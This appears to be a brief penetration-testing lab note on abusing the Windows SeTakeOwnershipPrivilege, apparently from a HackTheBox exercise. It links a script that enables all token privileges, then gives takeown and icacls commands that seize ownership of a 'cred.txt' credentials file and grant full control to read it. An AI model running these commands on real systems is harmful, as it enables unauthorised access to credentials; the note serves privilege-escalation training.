# SeTakeOwnershipPrivilege

First enable the permission using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

*   Get info:

    ```
    Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
    ```
*   Take ownership:

    ```
    takeown /f 'C:\Department Shares\Private\IT\cred.txt'
    ```
*   Modify ACL

    ```
    icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
    ```
* Access the file.
